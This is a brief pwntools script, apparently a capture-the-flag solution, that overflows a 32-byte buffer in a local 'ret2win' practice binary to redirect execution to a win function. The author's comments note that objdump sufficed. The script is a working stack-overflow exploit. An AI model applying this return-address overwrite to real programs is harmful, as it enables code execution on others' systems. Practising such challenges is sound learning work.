from pwn import *

p = process('./ret2win')

offset = 0x20 + 0x8

ret = 0x400770
win = 0x400756

payload = b"E"*offset + p64(ret) + p64(win)

p.recvuntil(b">")

p.sendline(payload)
p.interactive()

# This didn't need dynamic analysis
# all I needed to do was a simple objdump
# get the addresses, and boom
# yes, cyclical checking is good practice but...
# the challenge text literally told you that 32 bytes is the size of buf
# lol
